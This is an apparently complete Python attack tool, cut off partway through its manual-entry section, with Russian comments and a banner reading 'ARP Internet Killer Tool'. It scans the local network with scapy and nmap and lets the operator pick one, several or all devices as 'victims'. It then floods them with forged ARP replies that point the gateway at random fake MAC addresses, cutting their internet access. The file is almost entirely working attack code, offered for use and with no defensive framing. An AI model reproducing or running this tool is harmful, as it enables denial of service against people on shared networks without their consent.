#!/usr/bin/env python3
import os
import sys
import time
import random
import threading
import subprocess
import ipaddress
from scapy.all import ARP, send, srp, Ether, conf, sr1
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

conf.verb = 0

def run_fzf(options, prompt, multi=False):
    """Запуск fzf для выбора (одиночного или множественного)"""
    try:
        cmd = ['fzf', '--reverse', '--height=40%', '--prompt', prompt]
        if multi:
            cmd.append('--multi')
        
        result = subprocess.run(
            cmd,
            input='\n'.join(options),
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            if multi:
                return [line.strip() for line in result.stdout.strip().split('\n') if line]
            return result.stdout.strip()
    except:
        if multi:
            return simple_multi_select(options, prompt)
        return simple_select(options, prompt)
    return None

def simple_select(options, prompt):
    """Простой выбор если fzf не доступен"""
    print(f"\n{prompt}:")
    for i, option in enumerate(options, 1):
        print(f"  {i}. {option}")
    try:
        choice = int(input("Выберите номер: ")) - 1
        return options[choice]
    except:
        return None

def simple_multi_select(options, prompt):
    """Простой множественный выбор если fzf не доступен"""
    print(f"\n{prompt} (введите номера через пробел):")
    for i, option in enumerate(options, 1):
        print(f"  {i}. {option}")
    try:
        choices = input("Выберите номера: ").split()
        selected = []
        for choice in choices:
            idx = int(choice) - 1
            if 0 <= idx < len(options):
                selected.append(options[idx])
        return selected
    except:
        return []

def get_interfaces():
    """Получение сетевых интерфейсов"""
    interfaces = []
    try:
        output = subprocess.check_output(
            "ip -o link show | awk -F': ' '{print $2}' | grep -E '^(en|eth|wlan|wl|usb)' | sort",
            shell=True, text=True
        ).strip().split('\n')
        interfaces = [iface for iface in output if iface]
    except:
        # Резервные варианты
        try:
            output = subprocess.check_output(
                "ifconfig -a | grep -o '^[a-zA-Z0-9]*' | grep -v 'lo'",
                shell=True, text=True
            ).strip().split('\n')
            interfaces = [iface for iface in output if iface]
        except:
            interfaces = ["eth0", "wlan0", "usb0"]
    return interfaces

def get_network_info_enhanced(interface):
    """Улучшенное получение информации о сети с поддержкой Termux"""
    local_ip = None
    local_mac = None
    network_mask = None
    
    try:
        # Способ 1: Через sysfs (стандартный Linux)
        try:
            with open(f"/sys/class/net/{interface}/address", "r") as f:
                local_mac = f.read().strip()
        except:
            pass
        
        # Способ 2: Через ip команду
        result = subprocess.run(
            f"ip -4 addr show {interface} 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        if result.returncode == 0 and result.stdout:
            lines = result.stdout.strip().split('\n')
            for line in lines:
                if 'inet' in line:
                    parts = line.strip().split()
                    ip_info = parts[1]
                    local_ip = ip_info.split('/')[0]
                    network_mask = int(ip_info.split('/')[1])
                    break
        
        # Способ 3: Для Termux - через ifconfig
        if not local_ip:
            result = subprocess.run(
                f"ifconfig {interface} 2>/dev/null",
                shell=True, capture_output=True, text=True
            )
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.strip().split('\n'):
                    if 'inet ' in line:
                        parts = line.strip().split()
                        local_ip = parts[1]
                        # Пытаемся получить маску
                        if 'netmask' in parts:
                            mask_idx = parts.index('netmask') + 1
                            if mask_idx < len(parts):
                                mask_hex = parts[mask_idx]
                                # Конвертируем hex маску в CIDR
                                if mask_hex.startswith('0x'):
                                    mask_int = int(mask_hex, 16)
                                    # Подсчет битов в маске
                                    network_mask = bin(mask_int).count('1')
        
        # Способ 4: Для Termux - через ip link
        if not local_mac:
            result = subprocess.run(
                f"ip link show {interface} 2>/dev/null | grep link/ether",
                shell=True, capture_output=True, text=True
            )
            if result.returncode == 0 and result.stdout:
                local_mac = result.stdout.strip().split()[1]
        
        # Способ 5: Резервный - через ipconfig (Android)
        if not local_ip:
            try:
                result = subprocess.run(
                    "ipconfig 2>/dev/null",
                    shell=True, capture_output=True, text=True
                )
                if result.returncode == 0:
                    for line in result.stdout.strip().split('\n'):
                        if 'IP Address' in line:
                            local_ip = line.split(':')[-1].strip()
                        elif 'Subnet Mask' in line:
                            mask = line.split(':')[-1].strip()
                            # Конвертируем маску в CIDR
                            mask_parts = mask.split('.')
                            if len(mask_parts) == 4:
                                mask_bin = ''.join([bin(int(x))[2:].zfill(8) for x in mask_parts])
                                network_mask = mask_bin.count('1')
            except:
                pass
        
        return local_ip, local_mac, network_mask
        
    except Exception as e:
        print(f"\033[1;33m[!] Ошибка получения сетевой информации: {str(e)}\033[0m")
        return None, None, None

def get_gateway_info():
    """Автоматическое получение шлюза с множеством альтернативных методов"""
    gateway_ip = None
    gateway_mac = None
    
    methods = [
        ("ip route (Linux)", "ip route | grep default | head -1"),
        ("route -n", "route -n 2>/dev/null | grep '^0.0.0.0' | head -1"),
        ("netstat -rn", "netstat -rn 2>/dev/null | grep '^0.0.0.0' | head -1"),
        ("ip -4 route", "ip -4 route show default 2>/dev/null | head -1"),
        ("Termux: netstat", "netstat -rn 2>/dev/null | grep UG | head -1"),
        ("ip neigh show", "ip neigh show 2>/dev/null | grep 'router' | head -1"),
    ]
    
    print(f"\033[1;33m[*] Ищу шлюз различными методами...\033[0m")
    
    # Метод 1: Перебираем все способы получения IP шлюза
    for method_name, cmd in methods:
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if result.returncode == 0 and result.stdout.strip():
                output = result.stdout.strip()
                
                # Парсим вывод в зависимости от формата
                if "ip route" in cmd or "ip -4 route" in cmd:
                    # Формат: default via 192.168.1.1 dev wlan0
                    parts = output.split()
                    if "via" in parts:
                        idx = parts.index("via") + 1
                        if idx < len(parts):
                            gateway_ip = parts[idx]
                elif "route -n" in cmd or "netstat -rn" in cmd:
                    # Формат: 0.0.0.0 192.168.1.1 0.0.0.0 UG
                    parts = output.split()
                    if len(parts) >= 2:
                        gateway_ip = parts[1]
                elif "ip neigh show" in cmd:
                    # Формат: 192.168.1.1 dev wlan0 lladdr xx:xx:xx:xx:xx:xx REACHABLE
                    parts = output.split()
                    if len(parts) >= 1:
                        gateway_ip = parts[0]
                
                if gateway_ip and gateway_ip != "0.0.0.0":
                    print(f"  \033[1;32m[✓] Метод '{method_name}': найден шлюз {gateway_ip}\033[0m")
                    break
                else:
                    print(f"  \033[1;33m[!] Метод '{method_name}': не удалось извлечь IP\033[0m")
                    
        except (subprocess.TimeoutExpired, Exception) as e:
            print(f"  \033[1;33m[!] Метод '{method_name}' не сработал: {str(e)}\033[0m")
            continue
    
    # Метод 2: Если стандартные методы не помогли, пробуем получить через DNS или сетевые настройки
    if not gateway_ip:
        print(f"  \033[1;33m[*] Стандартные методы не сработали, пробую альтернативные...\033[0m")
        
        # Попытка получить через resolv.conf (обычно указывает на шлюз как DNS)
        try:
            with open("/etc/resolv.conf", "r") as f:
                for line in f:
                    if line.startswith("nameserver"):
                        dns_server = line.split()[1]
                        # Проверяем, является ли DNS локальным IP
                        if dns_server.startswith("192.168.") or \
                           dns_server.startswith("10.") or \
                           dns_server.startswith("172.16.") or \
                           dns_server.startswith("172.31."):
                            gateway_ip = dns_server
                            print(f"  \033[1;32m[✓] Найден шлюз через resolv.conf: {gateway_ip}\033[0m")
                            break
        except:
            pass
        
        # Метод для Termux: использование getprop (Android)
        if not gateway_ip:
            try:
                # В Android можно попробовать получить через системные свойства
                result = subprocess.run(
                    "getprop | grep -E '(net.dns|dhcp.*gateway)'",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    for line in result.stdout.strip().split('\n'):
                        if "gateway" in line.lower() or "dns" in line.lower():
                            parts = line.split(':')
                            if len(parts) > 1:
                                ip_candidate = parts[1].strip().strip('[]')
                                # Проверяем, что это IP адрес
                                if '.' in ip_candidate and ip_candidate.count('.') == 3:
                                    gateway_ip = ip_candidate
                                    print(f"  \033[1;32m[✓] Найден шлюз через getprop: {gateway_ip}\033[0m")
                                    break
            except:
                pass
        
        # Метод 3: Пробуем определить шлюз по последнему октету (часто .1 или .254)
        if not gateway_ip:
            try:
                # Получаем свой IP
                result = subprocess.run(
                    "ip -4 addr show | grep inet | head -1",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    ip_line = result.stdout.strip()
                    if ip_line:
                        own_ip = ip_line.split()[1].split('/')[0]
                        ip_parts = own_ip.split('.')
                        if len(ip_parts) == 4:
                            # Пробуем распространенные адреса шлюза
                            common_gateways = [
                                f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1",
                                f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.254",
                                f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.100",
                                f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.2",
                            ]
                            
                            # Проверяем каждый возможный шлюз
                            for test_gateway in common_gateways:
                                try:
                                    # Быстрый ARP пинг
                                    arp_req = ARP(pdst=test_gateway)
                                    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                                    packet = broadcast / arp_req
                                    answered, _ = srp(packet, timeout=0.5, verbose=False, retry=1)
                                    if answered:
                                        gateway_ip = test_gateway
                                        print(f"  \033[1;32m[✓] Определен шлюз по паттерну: {gateway_ip}\033[0m")
                                        break
                                except:
                                    continue
            except:
                pass
    
    # Метод 4: Если IP найден, но нет MAC - спрашиваем пользователя
    if not gateway_ip:
        print(f"  \033[1;33m[!] Не удалось автоматически определить IP шлюза\033[0m")
        return None, None
    
    # Теперь ищем MAC адрес шлюза
    print(f"  \033[1;33m[*] Определяю MAC адрес шлюза {gateway_ip}...\033[0m")
    
    mac_methods = [
        ("ARP таблица", f"ip neigh show {gateway_ip} 2>/dev/null | awk '{{print $5}}'"),
        ("arp -a", f"arp -a {gateway_ip} 2>/dev/null | grep -o -E '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}'"),
        ("arp -n", f"arp -n {gateway_ip} 2>/dev/null | grep -o -E '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}'"),
    ]
    
    for method_name, cmd in mac_methods:
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            if result.returncode == 0 and result.stdout.strip():
                gateway_mac = result.stdout.strip()
                print(f"  \033[1;32m[✓] MAC из {method_name}: {gateway_mac}\033[0m")
                break
        except:
            continue
    
    # Если MAC не нашелся в таблицах, делаем ARP запрос
    if not gateway_mac:
        print(f"  \033[1;33m[*] Делаю ARP запрос к шлюзу {gateway_ip}...\033[0m")
        
        # Пробуем несколько раз с разными таймаутами
        for attempt in range(3):
            timeout = 0.5 * (attempt + 1)  # 0.5, 1.0, 1.5 секунды
            retries = attempt + 1  # 1, 2, 3 попытки
            
            try:
                arp_req = ARP(pdst=gateway_ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = broadcast / arp_req
                answered, _ = srp(
                    packet, 
                    timeout=timeout, 
                    verbose=False, 
                    retry=retries,
                    iface_hint=conf.iface
                )
                
                if answered:
                    gateway_mac = answered[0][1].hwsrc
                    print(f"  \033[1;32m[✓] MAC получен через ARP запрос: {gateway_mac}\033[0m")
                    break
                else:
                    print(f"  \033[1;33m[!] Попытка {attempt+1}: ARP запрос не ответил\033[0m")
            except Exception as e:
                print(f"  \033[1;33m[!] Ошибка ARP запроса: {str(e)}\033[0m")
    
    # Если всё еще нет MAC, пробуем сканировать всю подсеть
    if not gateway_mac:
        print(f"  \033[1;33m[*] Пробую сканировать подсеть для поиска шлюза...\033[0m")
        
        try:
            # Получаем свою подсеть
            result = subprocess.run(
                "ip -4 addr show | grep inet | head -1",
                shell=True,
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                ip_info = result.stdout.strip().split()[1]
                network_addr = ip_info.split('/')[0]
                mask = ip_info.split('/')[1]
                
                # Сканируем несколько адресов вокруг предполагаемого шлюза
                ip_parts = network_addr.split('.')
                if len(ip_parts) == 4:
                    base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                    
                    # Список адресов для проверки (типичные адреса шлюза)
                    test_ips = [
                        f"{base}.1", f"{base}.254", f"{base}.100",
                        f"{base}.2", f"{base}.253", gateway_ip
                    ]
                    
                    for test_ip in test_ips:
                        if test_ip == network_addr:  # Пропускаем свой IP
                            continue
                            
                        try:
                            arp_req = ARP(pdst=test_ip)
                            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                            packet = broadcast / arp_req
                            answered, _ = srp(packet, timeout=0.3, verbose=False, retry=1)
                            
                            if answered:
                                gateway_mac = answered[0][1].hwsrc
                                gateway_ip = test_ip  # Обновляем IP на найденный
                                print(f"  \033[1;32m[✓] Найден активный шлюз: {gateway_ip} ({gateway_mac})\033[0m")
                                break
                        except:
                            continue
        except Exception as e:
            print(f"  \033[1;33m[!] Ошибка при сканировании: {str(e)}\033[0m")
    
    # Если MAC так и не найден, возвращаем только IP
    if gateway_ip and not gateway_mac:
        print(f"  \033[1;33m[⚠] MAC шлюза не найден, но IP определен: {gateway_ip}\033[0m")
        print(f"  \033[1;34m[?] MAC будет запрошен у пользователя или определен позже\033[0m")
        return gateway_ip, None
    
    if gateway_ip and gateway_mac:
        print(f"  \033[1;32m[✓] Шлюз успешно определен: {gateway_ip} ({gateway_mac})\033[0m")
        return gateway_ip, gateway_mac
    
    return None, None

def aggressive_arp_ping(ip, timeout=0.5, retry=3):
    """Агрессивный ARP пинг с несколькими попытками"""
    for attempt in range(retry):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            
            # Используем sr1 с более агрессивными параметрами
            response = sr1(packet, timeout=timeout, verbose=False, retry=1)
            
            if response:
                return {
                    'ip': response.psrc,
                    'mac': response.hwsrc
                }
        except:
            pass
    return None

def find_local_network_devices(local_ip, mask):
    """Поиск устройств в локальной сети разными методами"""
    devices = []
    found_ips = set()
    
    # Определяем сеть
    try:
        network = ipaddress.IPv4Network(f"{local_ip}/{mask}", strict=False)
        network_prefix = str(network.network_address).rsplit('.', 1)[0]
    except:
        ip_parts = local_ip.split('.')
        network_prefix = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
    
    print(f"\n\033[1;36m🔍 Агрессивное сканирование сети {network_prefix}.0/{mask}\033[0m")
    print("\033[1;33mℹ  Использую комбинированные методы сканирования...\033[0m")
    
    print(f"\033[1;33m Сканирование с помощью nmap (если доступен)...\033[0m")
    
    # Метод 2: Используем nmap если есть (самый надежный метод)
    try:
        # Проверяем, установлен ли nmap
        subprocess.run(["which", "nmap"], capture_output=True, check=True)
        
        print("  \033[1;33m[*] Запускаю nmap...\033[0m")
        
        # Быстрое сканирование с nmap
        result = subprocess.run(
            f"nmap -sn -n --min-parallelism 100 --max-rtt-timeout 2000ms {network_prefix}.0/24",
            shell=True, capture_output=True, text=True, timeout=60
        )
        
        if result.returncode == 0:
            # Парсим вывод nmap
            lines = result.stdout.split('\n')
            current_ip = None
            
            for line in lines:
                if 'Nmap scan report for' in line:
                    parts = line.split()
                    current_ip = parts[4]
                elif 'MAC Address:' in line and current_ip:
                    parts = line.split()
                    mac = parts[2]
                    
                    if current_ip not in found_ips and current_ip != local_ip:
                        devices.append({'ip': current_ip, 'mac': mac})
                        found_ips.add(current_ip)
                        current_ip = None
    except:
        print("  \033[1;33m[!] nmap не найден или произошла ошибка\033[0m")
    
    # Сортируем устройства по IP
    devices.sort(key=lambda x: [int(octet) for octet in x['ip'].split('.')])
    
    return devices

def show_banner():
    """Показ баннера"""
    os.system('clear')
    print("""
    \033[1;31m
╔═══════════════════════════════════════════════════════════════════╗
║                🔥 ARP Internet Killer Tool 🔥                    ║
║        Максимально агрессивное сканирование сети                  ║
║                     Многопользовательская атака                   ║
╚═══════════════════════════════════════════════════════════════════╝\033[0m
    """)

class ARPAttack:
    """Класс для управления ARP атакой на несколько жертв"""
    def __init__(self, interface, gateway_ip, gateway_mac):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.victims = []  # Список жертв: [{'ip': ..., 'mac': ...}, ...]
        self.attack_active = False
        self.packets_sent = 0
        self.start_time = time.time()
        
    def add_victim(self, ip, mac):
        """Добавление жертвы"""
        self.victims.append({'ip': ip, 'mac': mac})
    
    def remove_victim(self, ip):
        """Удаление жертвы по IP"""
        self.victims = [v for v in self.victims if v['ip'] != ip]
    
    def get_victim_count(self):
        """Получение количества жертв"""
        return len(self.victims)
    
    def start_attack(self):
        """Запуск атаки на всех жертв"""
        if not self.victims:
            print("\033[1;31m[!] Нет выбранных жертв!\033[0m")
            return
        
        self.attack_active = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        print(f"\n\033[1;31m[🔥] АТАКА ЗАПУЩЕНА НА {len(self.victims)} ЖЕРТВ!\033[0m")
        print(f"\033[1;33m[📡] Отправка ARP-пакетов через {self.interface}\033[0m")
        print(f"\033[1;32m[✋] Нажмите Ctrl+C для остановки\033[0m\n")
        
        try:
            while self.attack_active:
                # Отправляем пакеты каждой жертве
                for victim in self.victims:
                    # Генерируем случайный ложный MAC
                    fake_mac = f"00:{random.randint(16, 99):02d}:{random.randint(16, 99):02d}:" \
                              f"{random.randint(16, 99):02d}:{random.randint(16, 99):02d}:{random.randint(16, 99):02d}"
                    
                    # Отправляем жертве ложный ARP-ответ
                    arp_packet = ARP(
                        op=2,  # ARP reply
                        pdst=victim['ip'],
                        hwdst=victim['mac'],
                        psrc=self.gateway_ip,
                        hwsrc=fake_mac
                    )
                    
                    send(arp_packet, verbose=False)
                    self.packets_sent += 1
                
                # Обновление статуса
                elapsed = int(time.time() - self.start_time)
                if len(self.victims) <= 3:
                    victim_list = ", ".join([v['ip'] for v in self.victims])
                else:
                    victim_list = f"{len(self.victims)} устройств"
                
                status = f"\033[1;36m[📊] Пакетов: {self.packets_sent:6d} | Время: {elapsed:4d}с | Жертвы: {victim_list}\033[0m"
                sys.stdout.write(f"\r{' '*100}\r{status}")
                sys.stdout.flush()
                
                time.sleep(0.2)
                
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Остановка атаки и восстановление ARP таблиц"""
        self.attack_active = False
        
        print(f"\n\n\033[1;32m{'═'*60}\033[0m")
        print("\033[1;42m" + " ВОССТАНОВЛЕНИЕ ".center(60) + "\033[0m")
        print(f"\033[1;32m{'═'*60}\033[0m")
        
        # Восстанавливаем каждую жертву
        for victim in self.victims:
            print(f"\033[1;33m[*] Восстанавливаю ARP-таблицу жертвы {victim['ip']}...\033[0m")
            
            for i in range(20):
                restore_packet = ARP(
                    op=2,
                    pdst=victim['ip'],
                    hwdst=victim['mac'],
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac
                )
                send(restore_packet, verbose=False)
                time.sleep(0.05)
            
            print(f"\033[1;32m[✓] Жертва {victim['ip']} восстановлена\033[0m")
        
        elapsed = int(time.time() - self.start_time)
        print(f"\n\033[1;32m[✓] Всего отправлено пакетов: {self.packets_sent}\033[0m")
        print(f"\033[1;32m[✓] Общее время атаки: {elapsed} секунд\033[0m")
        print(f"\033[1;32m[✓] Все жертвы снова видят шлюз {self.gateway_ip}\033[0m")

def main():
    # Проверка прав
    if os.geteuid() != 0:
        print("\033[1;31m[!] Требуются права root! Запустите:\033[0m")
        print("\033[1;33m    sudo python3 arp_kill.py\033[0m")
        sys.exit(1)
    
    show_banner()
    
    # Выбор интерфейса
    interfaces = get_interfaces()
    if not interfaces:
        print("\033[1;31m[!] Не найдены сетевые интерфейсы\033[0m")
        sys.exit(1)
    
    interface = run_fzf(interfaces, "📡 Выберите интерфейс →")
    if not interface:
        print("\033[1;33m[!] Интерфейс не выбран\033[0m")
        sys.exit(1)
    
    # Получаем сетевую информацию
    local_ip, local_mac, network_mask = get_network_info_enhanced(interface)
    if not local_ip:
        print(f"\033[1;31m[!] Не удалось получить информацию для {interface}\033[0m")
        sys.exit(1)
    
    # Автоматически определяем шлюз
    print(f"\n\033[1;33m[*] Автоматически определяю шлюз...\033[0m")
    gateway_ip, gateway_mac = get_gateway_info()
    
    print(f"\n\033[1;32m[✓] Интерфейс:\033[0m \033[1;36m{interface}\033[0m")
    print(f"\033[1;32m[✓] Ваш IP:\033[0m \033[1;36m{local_ip}\033[0m")
    print(f"\033[1;32m[✓] Ваш MAC:\033[0m \033[1;36m{local_mac}\033[0m")
    print(f"\033[1;32m[✓] Маска сети:\033[0m \033[1;36m/{network_mask}\033[0m")
    
    if gateway_ip:
        print(f"\033[1;32m[✓] Найден шлюз:\033[0m \033[1;36m{gateway_ip}\033[0m")
        if gateway_mac:
            print(f"\033[1;32m[✓] MAC шлюза:\033[0m \033[1;36m{gateway_mac}\033[0m")
    else:
        print(f"\033[1;33m[!] Шлюз не найден автоматически\033[0m")
    
    # Выбор режима
    mode_options = []
    mode_options.append("🔍 Агрессивное сканирование сети")
    mode_options.append("📝 Ввести данные вручную")
    
    mode = run_fzf(mode_options, "🎯 Выберите режим →")
    if not mode:
        sys.exit(1)
    
    # Создаем объект атаки
    attack = ARPAttack(interface, gateway_ip, gateway_mac)
    
    if "сканирование" in mode.lower():
        # Цикл выбора с опцией повторного сканирования
        while True:
            # Агрессивное сканирование сети
            devices = find_local_network_devices(local_ip, network_mask)
            
            # Выводим найденные устройства
            print(f"\n\033[1;32m{'═'*60}\033[0m")
            if devices:
                print(f"\033[1;42m НАЙДЕНО УСТРОЙСТВ: {len(devices)} ".center(60) + "\033[0m")
            else:
                print(f"\033[1;41m УСТРОЙСТВА НЕ НАЙДЕНЫ ".center(60) + "\033[0m")
            print(f"\033[1;32m{'═'*60}\033[0m")
            
            # Отображаем текущих выбранных жертв
            if attack.get_victim_count() > 0:
                print(f"\033[1;35m[✓] Выбрано жертв: {attack.get_victim_count()}\033[0m")
                for i, victim in enumerate(attack.victims, 1):
                    print(f"  \033[1;36m{i}. {victim['ip']} ({victim['mac']})\033[0m")
                print()
            
            for i, device in enumerate(devices, 1):
                # Помечаем уже выбранных жертв
                is_selected = any(v['ip'] == device['ip'] for v in attack.victims)
                if is_selected:
                    print(f"\033[1;41m{i:3d}. IP: {device['ip']:15s} | MAC: {device['mac']} ✓\033[0m")
                else:
                    print(f"\033[1;36m{i:3d}. IP: {device['ip']:15s} | MAC: {device['mac']}\033[0m")
            
            # Создаем список опций
            options_list = []
            
            # Опция выбора шлюза (только если еще не выбран)
            if not gateway_ip or not gateway_mac:
                if devices:
                    options_list.append("🌐 Выбрать шлюз из списка")
                else:
                    options_list.append("🌐 Ввести шлюз вручную")
            
            # Опции для жертв
            if devices:
                # Показываем устройства, которые еще не выбраны как жертвы
                available_victims = []
                for d in devices:
                    if d['ip'] != local_ip and (not gateway_ip or d['ip'] != gateway_ip):
                        # Проверяем, не выбрана ли уже эта жертва
                        if not any(v['ip'] == d['ip'] for v in attack.victims):
                            available_victims.append(d)
                
                if available_victims:
                    options_list.append("🎯 Выбрать жертвы из списка (несколько)")
                    options_list.append("➕ Добавить все устройства в список жертв")
                
                if attack.get_victim_count() > 0:
                    options_list.append("➖ Удалить жертву из списка")
                    options_list.append("🗑️  Очистить список жертв")
                
                if attack.get_victim_count() > 0:
                    options_list.append("🔥 Начать атаку на выбранных жертв")
            else:
                options_list.append("🎯 Ввести жертвы вручную")
            
            # Общие опции
            options_list.append("🔄 Повторить сканирование сети")
            options_list.append("❌ Выйти в главное меню")
            
            # Выбор действия
            action = run_fzf(options_list, "📋 Выберите действие →")
            if not action:
                sys.exit(1)
            
            if "Выбрать шлюз" in action:
                # Выбираем шлюз из списка
                device_list = [f"{d['ip']:15s} | {d['mac']}" for d in devices]
                gateway_choice = run_fzf(device_list, "🌐 Выберите шлюз (роутер) →")
                if gateway_choice:
                    gateway_ip = gateway_choice.split('|')[0].strip()
                    for d in devices:
                        if d['ip'] == gateway_ip:
                            gateway_mac = d['mac']
                            print(f"\033[1;32m[✓] Шлюз выбран: {gateway_ip} ({gateway_mac})\033[0m")
                            # Обновляем объект атаки
                            attack.gateway_ip = gateway_ip
                            attack.gateway_mac = gateway_mac
                            break
            
            elif "Ввести шлюз вручную" in action:
                # Ввод шлюза вручную
                gateway_ip = input("\n\033[1;34m[?] Введите IP шлюза: \033[0m").strip()
                # Определяем MAC шлюза
                print(f"\n\033[1;33m[*] Определяю MAC шлюза {gateway_ip}...\033[0m")
                for attempt in range(3):
                    arp_req = ARP(pdst=gateway_ip)
                    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = broadcast / arp_req
                    answered, _ = srp(packet, timeout=3, verbose=False, retry=2)
                    if answered:
                        gateway_mac = answered[0][1].hwsrc
                        print(f"\033[1;32m[✓] MAC шлюза: {gateway_mac}\033[0m")
                        # Обновляем объект атаки
                        attack.gateway_ip = gateway_ip
                        attack.gateway_mac = gateway_mac
                        break
                else:
                    gateway_mac = input(f"\033[1;34m[?] Введите MAC шлюза {gateway_ip}: \033[0m").strip()
                    attack.gateway_ip = gateway_ip
                    attack.gateway_mac = gateway_mac
            
            elif "Выбрать жертвы из списка" in action:
                # Выбираем жертвы из списка (множественный выбор)
                victims_list = []
                for d in available_victims:
                    victims_list.append(f"{d['ip']:15s} | {d['mac']}")
                
                selected_victims = run_fzf(victims_list, "🎯 Выберите жертвы (Space для выбора, Enter для подтверждения) →", multi=True)
                if selected_victims:
                    for victim_str in selected_victims:
                        victim_ip = victim_str.split('|')[0].strip()
                        for d in available_victims:
                            if d['ip'] == victim_ip:
                                # Проверяем, не добавлена ли уже эта жертва
                                if not any(v['ip'] == victim_ip for v in attack.victims):
                                    attack.add_victim(victim_ip, d['mac'])
                                    print(f"\033[1;32m[+] Жертва добавлена: {victim_ip}\033[0m")
                                break
            
            elif "Добавить все устройства" in action:
                # Добавляем все устройства как жертвы
                count = 0
                for d in devices:
                    if d['ip'] != local_ip and (not gateway_ip or d['ip'] != gateway_ip):
                        if not any(v['ip'] == d['ip'] for v in attack.victims):
                            attack.add_victim(d['ip'], d['mac'])
                            count += 1
                print(f"\033[1;32m[+] Добавлено {count} жертв\033[0m")
            
            elif "Удалить жертву из списка" in action:
                # Удаляем жертву из списка
                if attack.get_victim_count() > 0:
                    victims_list = [f"{v['ip']:15s} | {v['mac']}" for v in attack.victims]
                    victim_to_remove = run_fzf(victims_list, "➖ Выберите жертву для удаления →")
                    if victim_to_remove:
                        victim_ip = victim_to_remove.split('|')[0].strip()
                        attack.remove_victim(victim_ip)
                        print(f"\033[1;33m[-] Жертва удалена: {victim_ip}\033[0m")
            
            elif "Очистить список жертв" in action:
                # Очищаем список жертв
                attack.victims = []
                print(f"\033[1;33m[-] Список жертв очищен\033[0m")
            
            elif "Ввести жертвы вручную" in action:
                # Ввод жертв вручную
                print("\n\033[1;34m[?] Введите IP жертв (через пробел или запятую):\033[0m")
                victim_ips_input = input("   IP жертв: ").strip()
                
                # Разделяем ввод
                victim_ips = []
                for separator in [',', ' ', ';', '|']:
                    if separator in victim_ips_input:
                        victim_ips = [ip.strip() for ip in victim_ips_input.split(separator) if ip.strip()]
                        break
                
                if not victim_ips:
                    victim_ips = [victim_ips_input]
                
                for victim_ip in victim_ips:
                    if victim_ip:
                        # Определяем MAC жертвы
                        print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
                        victim_mac = None
                        for attempt in range(3):
                            arp_req = ARP(pdst=victim_ip)
                            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                            packet = broadcast / arp_req
                            answered, _ = srp(packet, timeout=3, verbose=False, retry=2)
                            if answered:
                                victim_mac = answered[0][1].hwsrc
                                print(f"\033[1;32m[✓] MAC жертвы: {victim_mac}\033[0m")
                                break
                        
                        if not victim_mac:
                            victim_mac = input(f"\033[1;34m[?] Введите MAC жертвы {victim_ip}: \033[0m").strip()
                        
                        if victim_mac:
                            # Проверяем, не добавлена ли уже эта жертва
                            if not any(v['ip'] == victim_ip for v in attack.victims):
                                attack.add_victim(victim_ip, victim_mac)
                                print(f"\033[1;32m[+] Жертва добавлена: {victim_ip}\033[0m")
            
            elif "Начать атаку" in action:
                # Проверяем, есть ли все данные для атаки
                if not gateway_ip or not gateway_mac:
                    print("\033[1;31m[!] Не указан шлюз!\033[0m")
                    continue
                
                if attack.get_victim_count() == 0:
                    print("\033[1;31m[!] Нет выбранных жертв!\033[0m")
                    continue
                
                break  # Выходим из цикла для начала атаки
            
            elif "Повторить сканирование" in action:
                # Просто продолжаем цикл (начнется с нового сканирования)
                continue
            
            elif "Выйти в главное меню" in action:
                print("\033[1;33m[!] Возврат в главное меню\033[0m")
                main()  # Просто выходим, можно перезапустить скрипт
    
    else:  # Ручной режим
        print("\n\033[1;34m[?] Введите данные вручную:\033[0m")
        
        # Предлагаем использовать автоматически найденный шлюз
        if gateway_ip:
            use_auto = run_fzf([f"✅ Использовать автоматически найденный шлюз ({gateway_ip})", "📝 Ввести другой шлюз"], "🌐 Выберите шлюз →")
            if "автоматически" in use_auto:
                print(f"\033[1;32m[✓] Использую шлюз: {gateway_ip}\033[0m")
                if not gateway_mac:
                    print(f"\033[1;33m[*] Определяю MAC шлюза {gateway_ip}...\033[0m")
                    for attempt in range(3):
                        arp_req = ARP(pdst=gateway_ip)
                        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                        packet = broadcast / arp_req
                        answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
                        if answered:
                            gateway_mac = answered[0][1].hwsrc
                            print(f"\033[1;32m[✓] MAC шлюза: {gateway_mac}\033[0m")
                            break
                    else:
                        gateway_mac = input(f"\033[1;34m[?] Введите MAC шлюза {gateway_ip}: \033[0m").strip()
                
                # Обновляем объект атаки
                attack.gateway_ip = gateway_ip
                attack.gateway_mac = gateway_mac
            else:
                gateway_ip = input("   IP шлюза (роутера): ").strip()
                gateway_mac = None
        else:
            gateway_ip = input("   IP шлюза (роутера): ").strip()
            gateway_mac = None
        
        # Определяем MAC адрес шлюза если он не известен
